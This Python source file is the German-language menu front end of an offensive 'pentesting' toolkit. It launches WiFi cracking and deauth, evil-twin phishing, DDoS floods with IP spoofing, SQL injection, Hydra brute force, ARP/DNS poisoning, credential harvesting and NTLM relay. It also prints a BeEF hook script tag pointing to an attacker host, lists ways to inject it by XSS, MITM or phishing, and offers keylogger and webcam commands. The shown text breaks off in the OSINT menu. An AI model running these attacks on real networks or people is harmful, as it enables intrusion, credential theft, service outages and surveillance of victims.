#!/usr/bin/env python3
"""
PenKit Classic Menu — terminal-native numbered interface.
No dependencies beyond Python stdlib + tool modules.
"""

import os
import sys
import asyncio
import time
import random

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0m"          # reset
G  = "\033[92m"         # bright green
DG = "\033[32m"         # dark green
C  = "\033[96m"         # cyan
Y  = "\033[93m"         # yellow
RD = "\033[91m"         # red
W  = "\033[97m"         # white
DIM= "\033[2m"          # dim
B  = "\033[1m"          # bold
BL = "\033[5m"          # blink

def clr():
    os.system("clear" if os.name != "nt" else "cls")

def slow(text: str, delay: float = 0.018):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    clr()
    art = f"""
{DG}  ██████╗ ███████╗███╗   ██╗██╗  ██╗██╗████████╗
{G}  ██╔══██╗██╔════╝████╗  ██║██║ ██╔╝██║╚══██╔══╝
{G}  ██████╔╝█████╗  ██╔██╗ ██║█████╔╝ ██║   ██║
{G}  ██╔═══╝ ██╔══╝  ██║╚████║██╔═██╗ ██║   ██║
{DG}  ██║     ███████╗██║ ╚███║██║  ██╗██║   ██║
{DG}  ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
{DIM}  ┌────────────────────────────────────────────────────────┐{R}
{DIM}  │  {R}{C}Authorized Pentesting Toolkit  v3.0{R}{DIM}                    │{R}
{DIM}  │  {R}{DG}? = Assistent  |  T = Tutorials  |  H = Health Check{R}{DIM}   │{R}
{DIM}  └────────────────────────────────────────────────────────┘{R}
"""
    print(art)


def print_ascii_art(art: str, color: str = ""):
    c = color or "\033[32m"
    for line in art.strip().split("\n"):
        print(f"  {c}{line}\033[0m")

def section(title: str, subtitle: str = ""):
    w = 70
    print(f"\n{G}╔{'═'*(w-2)}╗{R}")
    print(f"{G}║{B}{title.center(w-2)}{R}{G}║{R}")
    if subtitle:
        print(f"{G}║{DIM}{subtitle.center(w-2)}{R}{G}║{R}")
    print(f"{G}╚{'═'*(w-2)}╝{R}\n")

def info_box(lines: list[str]):
    """Prints a dim info box — used to explain what a field means."""
    w = 68
    print(f"  {DIM}┌{'─'*(w-2)}┐{R}")
    for line in lines:
        padded = f"  {line}"
        print(f"  {DIM}│{R}{DIM}{padded:<{w-2}}{R}{DIM}│{R}")
    print(f"  {DIM}└{'─'*(w-2)}┘{R}")

def menu_item(num: str, label: str, danger: str = "", hint: str = ""):
    color = {"🟢": DG, "🟡": Y, "🟠": Y, "🔴": RD, "⛔": RD}.get(danger, G)
    hint_str = f"  {DIM}{hint}{R}" if hint else ""
    print(f"  {DIM}[{R}{G}{B}{num:>2}{R}{DIM}]{R}  {color}{B}{label}{R}{hint_str}  {danger}")

def prompt(text: str = "penkit") -> str:
    try:
        return input(f"\n{G}┌─[{C}{text}{G}]\n└─▶ {W}").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return "0"

def wait_key():
    input(f"\n{DIM}  [Press Enter to continue...]{R}")

def print_output_line(line: str):
    line = line.strip()
    if not line:
        return
    if "[+]" in line or "FOUND" in line or "SUCCESS" in line or "CRACKED" in line:
        print(f"  {G}✓  {line}{R}")
    elif "[ERROR]" in line or "ERROR" in line:
        print(f"  {RD}✗  {line}{R}")
    elif "[!]" in line or "WARN" in line or "THREAT" in line:
        print(f"  {Y}!  {line}{R}")
    elif "[*]" in line:
        print(f"  {C}→  {line}{R}")
    elif "═" in line or "─" in line:
        print(f"  {DG}{line}{R}")
    else:
        print(f"  {DIM}{line}{R}")

async def run_tool_live(gen):
    """Stream async generator output to terminal."""
    try:
        async for line in gen:
            print_output_line(line)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{R}")

# ── Tool input helpers ────────────────────────────────────────────────────────

def ask(label: str, default: str = "", required: bool = False) -> str:
    default_hint = f" [{DIM}{default}{R}]" if default else ""
    val = input(f"  {C}{label}{default_hint}: {W}").strip()
    if not val and default:
        return default
    if not val and required:
        print(f"  {RD}Required!{R}")
        return ask(label, default, required)
    return val

def ask_int(label: str, default: int) -> int:
    val = ask(label, str(default))
    try:
        return int(val)
    except ValueError:
        return default

# ═════════════════════════════════════════════════════════════════════════════
# MENUS
# ═════════════════════════════════════════════════════════════════════════════

async def menu_wifi():
    from tools.wifi import WifiScanner, HandshakeCapture, PMKIDAttack, DeauthFlood, EvilTwin
    from tools.wifi import WPSScanner, PixieDust, ReaverBrute, BeaconFlood
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("📡  WiFi ATTACKS", "WPA2/3 · WPS · Handshake · Evil Twin · Deauth · Beacon Flood")
        menu_item("1", "WiFi Scanner",               "🟡", "Scant alle APs + WPS-Status + Signal")
        menu_item("2", "Handshake Capture",          "🟠", "WPA2-Handshake für hashcat/aircrack")
        menu_item("3", "PMKID Attack",               "🟠", "Clientless WPA2-Angriff — kein Client nötig")
        menu_item("4", "Deauth Flood",               "🔴", "Clients vom Netz trennen")
        menu_item("5", "Evil Twin + Portal",         "🔴", "Fake-AP + Captive Portal → Passwort")
        menu_item("6", "WPS Scan",                   "🟡", "Findet WPS-fähige Router (wash)")
        menu_item("7", "Pixie-Dust Attack",          "🔴", "WPS-PIN in Sekunden offline cracken")
        menu_item("8", "Reaver WPS Brute-Force",     "🔴", "WPS online brute-force (2-10h)")
        menu_item("9", "Beacon Flood",               "🟠", "Tausende Fake-SSIDs senden (mdk4)")
        menu_item("A", "AUTO-CRACK PIPELINE",        "🔴", "Capture → Deauth → Handshake → Crack in einem Schritt")
        menu_item("0", "Back")

        choice = prompt("wifi")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            t = WifiScanner(iface)
            print(f"\n{G}[*] Starting... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.enable_monitor())
                await run_tool_live(t.scan())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID (AA:BB:CC:DD:EE:FF)", required=True)
            channel = ask("Channel", "6")
            t = HandshakeCapture(iface, cfg.get("output_dir", "/tmp"))
            print(f"\n{G}[*] Capturing... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture(bssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            bssid = ask("Target BSSID (empty = all APs)", "")
            t = PMKIDAttack(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.capture(bssid))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID", required=True)
            client = ask("Client MAC", "FF:FF:FF:FF:FF:FF")
            count = ask_int("Count (0=continuous)", 0)
            t = DeauthFlood(iface)
            print(f"\n{RD}[!] Deauthing {bssid}... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.flood(bssid, client, count))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            iface = ask("Interface", "wlan0")
            ssid = ask("Target SSID to clone", required=True)
            channel = ask("Channel", "6")
            t = EvilTwin(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.start(ssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            section("WPS SCANNER", "Zeigt alle APs mit aktivem WPS")
            info_box([
                "wash scannt nach WPS-fähigen APs.",
                "Locked=No → Pixie-Dust oder Reaver möglich",
                "Locked=Yes → Router hat WPS nach Fehlversuchen gesperrt",
            ])
            iface = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            timeout = ask_int("Scan-Dauer (Sekunden)", 30)
            t = WPSScanner(iface)
            try:
                await run_tool_live(t.scan(timeout))
            except KeyboardInterrupt:
                pass

        elif choice == "7":
            section("PIXIE-DUST ATTACK", "WPS-PIN offline cracken — keine Brute-Force nötig")
            info_box([
                "Pixie-Dust nutzt schwache Zufallszahlen in WPS-Implementierungen.",
                "Funktioniert bei ~25% aller Router. Ergebnis in 1-60 Sekunden.",
                "Monitor-Mode muss aktiv sein (airmon-ng start wlan0).",
                "BSSID: MAC-Adresse des Routers (z.B. AA:BB:CC:DD:EE:FF)",
            ])
            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid   = ask("Ziel BSSID", required=True)
            channel = ask("Kanal", "6")
            t = PixieDust(iface)
            try:
                await run_tool_live(t.attack(bssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "8":
            section("REAVER WPS BRUTE-FORCE", "Online-Angriff — probiert alle WPS-PINs durch")
            info_box([
                "WARNUNG: Dauert 2-10 Stunden. Fortschritt wird automatisch gespeichert.",
                "Viele Router sperren WPS nach mehreren Fehlversuchen (WPS Lock).",
                "Delay = Wartezeit zwischen Versuchen (empfohlen: 1-2 Sekunden).",
                "Reaver macht automatisch Pause bei Rate-Limiting.",
            ])
            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid   = ask("Ziel BSSID", required=True)
            channel = ask("Kanal", "6")
            delay   = float(ask("Delay zwischen Versuchen (Sek)", "1.0"))
            t = ReaverBrute(iface)
            try:
                await run_tool_live(t.attack(bssid, channel, delay))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "9":
            section("BEACON FLOOD", "Überschwemmt WiFi-Radar mit Fake-SSIDs")
            info_box([
                "Sendet hunderte gefälschte Beacon-Frames mit verschiedenen SSIDs.",
                "Alle Geräte in Reichweite sehen diese Netzwerke.",
                "Gut für: Ablenkung während Evil-Twin läuft.",
                "Benötigt: mdk4 (apt install mdk4)",
            ])
            iface  = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            count  = ask_int("Anzahl Fake-SSIDs", 200)
            custom = ask("Eigene SSIDs (kommagetrennt, leer=zufällig)", "")
            ssid_list = [s.strip() for s in custom.split(",") if s.strip()] if custom else None
            t = BeaconFlood(iface)
            try:
                await run_tool_live(t.flood(ssid_list, count))
            except KeyboardInterrupt:
                await t.stop()

        elif choice in ("a", "A"):
            section("AUTO-CRACK PIPELINE", "Capture → Deauth → Handshake erkannt → Convert → Hashcat")
            info_box([
                "Vollautomatisch: Du gibst BSSID + Kanal ein — der Rest passiert alleine.",
                "  1. Startet airodump-ng (Capture)",
                "  2. Sendet Deauth-Pakete (zwingt Client zur Neuverbindung)",
                "  3. Erkennt Handshake automatisch",
                "  4. Konvertiert zu hashcat .hc22000 Format",
                "  5. Crackt mit Wordlist",
                "Alle Dateien → ~/penkit-output/wifi/",
            ])
            iface    = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid    = ask("Ziel BSSID", required=True)
            channel  = ask("Kanal", "6")
            wordlist = ask("Wordlist", cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
            t = HandshakeCapture(iface)
            print()
            try:
                await run_tool_live(t.auto_crack_pipeline(bssid, channel, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_network():
    from tools.network import NetworkScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🌐  NETWORK INTELLIGENCE", "Scan · Topology · CVE · IoT · DDoS")
        menu_item(" 1", "🔍  Quick Host Discovery",    "🟡", "Aktive Hosts im Netzwerk finden")
        menu_item(" 2", "🗺️   Full Scan + Attack Chain","🟠", "Ports + Services + CVEs + Exploit-Vorschläge")
        menu_item(" 3", "🕵️   Stealth Scan",            "🟠", "SYN-Scan, langsam, weniger auffällig")
        menu_item(" 4", "💾  Export letzten Scan",     "🟢", "JSON-Export der Scan-Ergebnisse")
        menu_item(" 5", "📡  IoT Scanner",             "🔴", "Router/Kameras/NAS finden + Default-Creds testen")
        menu_item(" 6", "💥  DDoS / Stress-Test",      "⛔", "Slowloris, HTTP Flood, hping3 SYN-Flood")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("network")
        if choice == "0":
            return

        clr()
        scanner = NetworkScanner(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            try:
                await run_tool_live(scanner.discover_hosts(target))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice in ("2", "3"):
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            stealth = (choice == "3")
            print(f"\n{G}[*] Full scan running... this takes a few minutes{R}\n")
            try:
                await run_tool_live(scanner.full_scan(target, stealth=stealth))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice == "4":
            path = await scanner.export_json()
            if path:
                print(f"\n{G}[+] Exported: {path}{R}")
            else:
                print(f"\n{Y}[!] No scan data. Run a scan first.{R}")

        elif choice == "5":
            banner()
            section("📡  IOT SCANNER", "Router · Kameras · NAS · Smart Home")
            info_box([
                "Scannt nach IoT-Geräten im Netzwerk:",
                "  → Erkennt Hersteller + Modell automatisch",
                "  → Testet 60+ Default-Credential-Kombinationen",
                "  → Prüft HTTP Basic Auth + Form-Login + Telnet",
                "",
                "Beispiele für target:",
                "  192.168.1.0/24   — komplettes Heimnetz",
                "  192.168.1.1      — einzelner Router",
                "  10.0.0.0/24      — anderes Subnetz",
            ])
            print()
            target = ask("Ziel (IP oder CIDR)", "192.168.1.0/24")
            if not target:
                wait_key(); continue
            print(f"\n  {RD}🔴  Nur im eigenen / autorisierten Netzwerk!{R}\n")
            try:
                from tools.network.iot_scanner import IoTScanner
                scanner_iot = IoTScanner(target)
                await run_tool_live(scanner_iot.scan())
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "6":
            banner()
            section("💥  DDOS / STRESS-TEST", "Nur eigene / autorisierte Server!")
            info_box([
                "⛔  WARNUNG: DDoS-Angriffe auf fremde Server sind in Deutschland strafbar (§303b StGB).",
                "    Nur für: eigene Server-Tests, autorisierte Pentests, Lernzwecke im eigenen Netz.",
            ])
            print()
            menu_item(" 1", "🐌  Slowloris",      "⛔", "Hält HTTP-Verbindungen offen → Server-Threads erschöpft")
            menu_item(" 2", "🌊  HTTP Flood",      "⛔", "Asyncio GET-Flood → maximale Requests/sec")
            menu_item(" 3", "💀  hping3 SYN-Flood","⛔", "Kernel-level SYN-Flood mit gefälschten IPs")
            menu_item(" 0", "← Zurück", "")
            print()
            dchoice = prompt("ddos")

            if dchoice == "0":
                wait_key(); continue

            host = ask("Ziel-Host / IP", required=True)
            try:
                port = int(ask("Port", "80"))
            except ValueError:
                port = 80
            try:
                duration = int(ask("Dauer in Sekunden", "60"))
            except ValueError:
                duration = 60

            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
                print(f"  {Y}[!] Abgebrochen.{R}")
                wait_key(); continue

            print()
            try:
                if dchoice == "1":
                    from tools.network.ddos import Slowloris
                    try:
                        socks = int(ask("Anzahl Sockets", "200"))
                    except ValueError:
                        socks = 200
                    use_https = ask("HTTPS? [j/n]", "n").lower() in ("j", "y")
                    sl = Slowloris(host, port, socks, duration=duration, use_https=use_https)
                    await run_tool_live(sl.run())

                elif dchoice == "2":
                    from tools.network.ddos import HTTPFlood
                    proto = "https" if port in (443, 8443) else "http"
                    url   = ask("Ziel-URL", f"{proto}://{host}:{port}/")
                    try:
                        workers = int(ask("Worker-Anzahl (parallele Requests)", "100"))
                    except ValueError:
                        workers = 100
                    hf = HTTPFlood(url, workers=workers, duration=duration)
                    await run_tool_live(hf.run())

                elif dchoice == "3":
                    from tools.network.ddos import HpingFlood
                    mode = ask("Modus [syn/udp/icmp/ack]", "syn")
                    spoof = ask("Zufällige Quell-IP (Spoofing)? [j/n]", "j").lower() in ("j", "y")
                    hpf = HpingFlood(host, port, mode, duration, spoof_src=spoof)
                    await run_tool_live(hpf.run())

            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_web():
    from tools.web import WebFingerprinter, SmartFuzzer, SQLInjector, WebVulnScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("💻  WEB ATTACK", "Recon · Fuzzing · SQLi · XSS · Browser Exploitation")
        menu_item(" 1", "🔍  Fingerprint Target",          "🟡", "CMS, WAF, Server, Technologien erkennen")
        menu_item(" 2", "📂  Directory Fuzzer (ffuf)",     "🟠", "Versteckte Pfade, Admin-Panels, Backups")
        menu_item(" 3", "💉  SQL Injection (sqlmap)",      "🟠", "Auto-SQLi Erkennung + Datenbank-Dump")
        menu_item(" 4", "🔬  Vuln Scan (nikto + nuclei)",  "🟠", "Bekannte CVEs, Fehlkonfigurationen")
        menu_item(" 5", "🔗  Full Auto Chain",             "🟠", "Fingerprint → Fuzz → SQLi → Vuln Scan")
        menu_item(" 6", "🪝  BeEF Browser Exploitation",   "⛔", "Browser hooken, Keylogger, Screenshot, Webcam")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("web")
        if choice == "0":
            return

        clr()

        if choice in ("1","2","3","4","5"):
            url = ask("Target URL (https://...)", required=True)

        if choice == "1":
            t = WebFingerprinter()
            await run_tool_live(t.fingerprint(url))

        elif choice == "2":
            ext = ask("Extensions", "php,html,txt,js")
            fs  = ask("Filter size (noise, empty=off)", "")
            t = SmartFuzzer()
            try:
                await run_tool_live(t.fuzz_dirs(url, extensions=ext, filter_size=fs))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            waf = ask("WAF type (cloudflare/modsecurity, empty=auto)", "")
            t = SQLInjector()
            try:
                await run_tool_live(t.detect(url, waf))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = WebVulnScanner()
            try:
                await run_tool_live(t.full_scan(url))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            print(f"\n{G}[*] Phase 1: Fingerprint{R}")
            fp = WebFingerprinter(); await run_tool_live(fp.fingerprint(url))
            print(f"\n{G}[*] Phase 2: Fuzz{R}")
            fz = SmartFuzzer()
            try:
                await run_tool_live(fz.fuzz_dirs(url))
            except KeyboardInterrupt:
                pass
            print(f"\n{G}[*] Phase 3: Vuln Scan{R}")
            sc = WebVulnScanner()
            try:
                await run_tool_live(sc.nuclei_scan(url))
            except KeyboardInterrupt:
                pass

        elif choice == "6":
            banner()
            section("🪝  BEEF BROWSER EXPLOITATION", "Browser hooken via JavaScript")
            info_box([
                "BeEF hookt Browser über eine einzige JS-Zeile:",
                "  <script src='http://<KALI-IP>:3000/hook.js'></script>",
                "",
                "Wege zum Einschleusen:",
                "  A) XSS: in Kommentar/Suchfeld/URL-Parameter einbetten",
                "  B) MITM: bettercap injiziert Hook automatisch (Tools → MITM)",
                "  C) Phishing-Seite: in HTML der Fake-Login-Page einbauen",
                "",
                "Nach dem Hooking: vollständige Browser-Kontrolle.",
            ])
            print()
            menu_item(" 1", "▶  BeEF starten",              "🔴", "Startet beef-xss im Hintergrund")
            menu_item(" 2", "📋  Hook-Payloads anzeigen",   "🟡", "XSS-Payload, Script-Tag, MITM-Befehl")
            menu_item(" 3", "🖥️   Gehookte Browser anzeigen","🟡", "Wer ist gerade gehookt + Browser-Info")
            menu_item(" 4", "💻  Befehl ausführen",         "⛔", "Keylogger, Screenshot, Webcam, Cookies...")
            menu_item(" 0", "← Web-Menü", "")
            print()
            bchoice = prompt("beef")

            if bchoice == "1":
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().start_beef())

            elif bchoice == "2":
                kali_ip = ask("Deine Kali IP", "192.168.1.10")
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().get_hook_payloads(kali_ip))

            elif bchoice == "3":
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().list_hooked_browsers())

            elif bchoice == "4":
                from tools.web.beef_engine import BeEFEngine, COMMANDS
                session_id = ask("Session-ID (aus Option 3)")
                if not session_id:
                    wait_key(); continue
                print()
                for i, (key, info) in enumerate(COMMANDS.items(), 1):
                    print(f"  {DIM}[{i:>2}]{R}  {G}{info['label']}{R}")
                print()
                cmd_num = ask("Nummer")
                try:
                    cmd_key = list(COMMANDS.keys())[int(cmd_num) - 1]
                    await run_tool_live(BeEFEngine().run_command(session_id, cmd_key))
                except (ValueError, IndexError):
                    print(f"  {Y}[!] Ungültige Auswahl{R}")

        wait_key()


async def menu_passwords():
    from tools.passwords import HashcatCracker, JohnCracker, detect_hash
    from tools.passwords.hydra import HydraCracker
    from core.config import load
    cfg = load()
    wl = cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt")

    while True:
        banner()
        section("🔑  PASSWORDS & HASHES", "Hashcat GPU · John · Hydra · Smart Wordlist")
        menu_item("1", "Hash-Typ erkennen",           "🟢", "21 Typen: MD5, SHA, NTLM, bcrypt...")
        menu_item("2", "Hash cracken — Hashcat (GPU)","🟡", "GPU-beschleunigt, schnellste Methode")
        menu_item("3", "Hash cracken — John",         "🟡", "CPU-basiert, viele Formate")
        menu_item("4", "WPA2 .cap cracken",           "🟡", "Handshake → Passwort")
        menu_item("5", "Netzwerk Brute-Force (Hydra)","🟠", "SSH/FTP/RDP/SMB/MySQL/HTTP...")
        menu_item("6", "Smart Wordlist Generator",    "🟡", "Zielbasierte Liste aus OSINT-Daten")
        menu_item("0", "Back")

        choice = prompt("passwords")
        if choice == "0":
            return

        clr()
        if choice == "1":
            h = ask("Hash", required=True)
            results = detect_hash(h)
            print()
            for r in results:
                print(f"  {G}→  {B}{r.hash_type}{R}  {DIM}hashcat mode: {r.hashcat_mode}  john: {r.john_format}{R}")
                print(f"     {DIM}{r.description}{R}")

        elif choice == "2":
            h = ask("Hash or file path", required=True)
            mode = ask_int("Mode (-1 = auto)", -1)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, mode, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            h = ask("Hash or file path", required=True)
            fmt = ask("Format (empty = auto)", "")
            wordlist = ask("Wordlist", wl)
            t = JohnCracker(wordlist)
            try:
                await run_tool_live(t.crack(h, fmt, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            cap = ask(".cap file path", required=True)
            wordlist = ask("Wordlist", wl)
            t = HashcatCracker(wordlist)
            try:
                await run_tool_live(t.crack_cap(cap, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            target = ask("Target IP", required=True)
            proto  = ask("Protocol (ssh/ftp/rdp/smb/mysql)", "ssh")
            user   = ask("Username (empty = common defaults)", "")
            wordlist = ask("Wordlist", wl)
            port   = ask_int("Port (0 = default)", 0)
            t = HydraCracker()
            try:
                await run_tool_live(t.crack(target, proto, user, "", wordlist, port))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            from tools.passwords.wordlist_gen import generate, TargetProfile
            section("SMART WORDLIST GENERATOR", "Personalisierte Wordlist aus Ziel-Infos")
            info_box([
                "Generiert ~5000-50000 Passwörter basierend auf Ziel-Informationen.",
                "80% Erfolgsrate bei selbst gewählten Passwörtern vs. rockyou.txt.",
                "Leer lassen = überspringen. Mehr Infos = bessere Liste.",
            ])
            print(f"\n  {C}── Persönliche Daten ──{R}")
            first   = ask("Vorname")
            last    = ask("Nachname")
            nick    = ask("Spitzname / Username")
            bdate   = ask("Geburtsdatum (z.B. 15.02.1990)")
            partner = ask("Partner-Name")
            pbdate  = ask("Partner-Geburtsdatum")
            kids_s  = ask("Kinder-Namen (kommagetrennt)")
            pets_s  = ask("Haustier-Namen (kommagetrennt)")
            print(f"\n  {C}── Arbeit / Interessen ──{R}")
            company = ask("Firma")
            team    = ask("Lieblingsverein / Team")
            city    = ask("Stadt")
            print(f"\n  {C}── Digital ──{R}")
            username = ask("Benutzername / Social-Media Handle")
            domain  = ask("Domain / Website (z.B. example.com)")
            phone   = ask("Telefonnummer (nur Zahlen)")
            kws     = ask("Eigene Keywords (kommagetrennt)")
            out     = ask("Ausgabedatei", "/tmp/penkit_wordlist.txt")

            profile = TargetProfile(
                first_name=first, last_name=last, nickname=nick,
                birthdate=bdate, partner_name=partner, partner_birthdate=pbdate,
                child_names=[c.strip() for c in kids_s.split(",") if c.strip()],
                pet_names=[p.strip() for p in pets_s.split(",") if p.strip()],
                company=company, sports_team=team, city=city,
                username=username, domain=domain, phone=phone,
                keywords=[k.strip() for k in kws.split(",") if k.strip()],
            )
            print()
            try:
                await run_tool_live(generate(profile, out))
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_mitm():
    from tools.mitm import BettercapEngine, ResponderEngine
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("☠️   MITM — MAN IN THE MIDDLE", "ARP · SSL Strip · DNS · NTLM Relay · IPv6")
        menu_item("1", "ARP Spoof",                       "🔴", "Leitet Netzwerkverkehr durch Kali um")
        menu_item("2", "SSL Strip",                       "🔴", "HTTPS → HTTP downgrade, Passwörter im Klartext")
        menu_item("3", "DNS Poison",                      "🔴", "Domains auf eigene IP umleiten")
        menu_item("4", "Credential Harvester",            "🔴", "Live: alle Passwörter im Netzwerkverkehr")
        menu_item("5", "Responder (NTLM Hashes)",         "🔴", "LLMNR/NBT-NS Poisoning → NTLMv2 Hashes")
        menu_item("6", "mitm6 (IPv6 → Domain Admin)",     "⛔", "IPv6 DHCP Spoof → NTLM Relay → SYSTEM")
        menu_item("7", "Responder + NTLM Relay",          "⛔", "NTLM Relay via Responder + ntlmrelayx")
        menu_item("0", "Back")

        choice = prompt("mitm")
        if choice == "0":
            return

        clr()
        iface = ask("Interface", cfg.get("interface", "eth0"))

        if choice == "5":
            t = ResponderEngine(iface)
            print(f"\n{G}[*] Poisoning LLMNR/NBT-NS... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture())
            except KeyboardInterrupt:
                await t.stop()

        elif choice in ("1", "2", "3", "4"):
            target = ask("Victim IP/range (empty = entire subnet)", "")
            t = BettercapEngine(iface, cfg.get("output_dir", "/tmp"))
            try:
                if choice == "1":
                    await run_tool_live(t.arp_spoof(target))
                elif choice == "2":
                    await run_tool_live(t.ssl_strip(target))
                elif choice == "3":
                    domains  = ask("Domains to hijack", "*.google.com")
                    redirect = ask("Redirect IP (empty = auto)", "")
                    await run_tool_live(t.dns_poison(target, domains, redirect))
                elif choice == "4":
                    print(f"\n{G}[*] Live credential capture... Ctrl+C to stop{R}\n")
                    await run_tool_live(t.harvest_creds(target))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            from tools.mitm.mitm6_engine import Mitm6Attack
            section("mitm6 — IPv6 DHCP SPOOF + NTLM RELAY", "IPv6 → WPAD → NTLM Relay → SYSTEM/Domain Admin")
            info_box([
                "mitm6 sendet gefälschte IPv6 Router Advertisements ans LAN.",
                "Windows bevorzugt IPv6 → Kali wird DNS-Server → WPAD hijack.",
                "Kali erhält NTLM-Authentifizierung von Windows-Clients.",
                "Mit ntlmrelayx wird die Auth weitergeleitet → Shell oder AD-Änderungen.",
                "",
                "WICHTIG: Funktioniert in fast allen ungeschützten AD-Umgebungen.",
                "Relay-Modi: smb (Shell), ldap (AD-Zugang), http (Hash dump), socks",
            ])
            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if ask("Bestätigung", "").strip().lower() != "i confirm authorized use":
                print(f"  {Y}[!] Abgebrochen.{R}")
                wait_key()
                continue
            iface  = ask("Interface", cfg.get("interface", "eth0"))
            domain = ask("Ziel-Domain (z.B. corp.local)", required=True)
            target = ask("Relay-Ziel IP (leer = automatisch)", "")
            print(f"\n  {C}Relay-Modus:{R}")
            print(f"  {DIM}[smb]{R}   → Shell auf Remote-PC (SMB-Signing aus benötigt)")
            print(f"  {DIM}[ldap]{R}  → AD-Änderungen (neuen Admin anlegen)")
            print(f"  {DIM}[http]{R}  → NTLM-Hash dumpen (funktioniert immer)")
            print(f"  {DIM}[socks]{R} → SOCKS-Proxy mit authen. Session")
            mode = ask("Modus", "http")
            t = Mitm6Attack(iface)
            print()
            try:
                await run_tool_live(t.attack(domain, target, mode))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "7":
            from tools.mitm.mitm6_engine import ResponderNTLMRelay
            section("RESPONDER + NTLM RELAY", "LLMNR Poisoning → NTLM Relay → Remote Shell")
            info_box([
                "Responder vergiftet LLMNR/NBT-NS → Windows sendet NTLM-Auth.",
                "ntlmrelayx leitet das weiter an Ziel → Shell oder Hash.",
                "SMB-Signing muss deaktiviert sein für SMB-Relay.",
            ])
            iface  = ask("Interface", cfg.get("interface", "eth0"))
            target = ask("Relay-Ziel IP", required=True)
            t = ResponderNTLMRelay(iface)
            try:
                await run_tool_live(t.attack(target))
            except KeyboardInterrupt:
                await t.stop()

        wait_key()


async def menu_osint():
    from tools.osint import OSINTRecon
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🔍  OSINT RECON", "theHarvester · Sherlock · Sublist3r · Shodan · Google Dorks")
        menu_item("1", "theHarvester — E-Mails/Subdomains/IPs",  "🟡", "Erntet öffentliche Infos")
        menu_item("2", "Sherlock — Username auf 300+ Plattformen","🟡", "Findet alle Accounts")
        menu_item("3", "Subdomain Enumeration",                   "🟡", "Sublist3r + crt.sh + brute")
        menu_item("4", "Google Dorks Generator",                  "🟢", "Fertige Dork-Queries")
        menu_item("5", "Full Recon Pipeline",                     "🟡", "Alles in einem Lauf + Report")
        menu_item("6", "Shodan — Internet Device Search",         "🟡", "Verwundbare Geräte weltweit")
        menu_item("7", "Shodan — IP Lookup",                      "🟡", "Alle Infos zu einer IP")
        menu_item("8", "Shodan — Eigene externe IP",              "🟢", "Was sieht Internet von dir?")
        menu_item("0", "Back")

        choice = prompt("osint")
        if choice == "0":
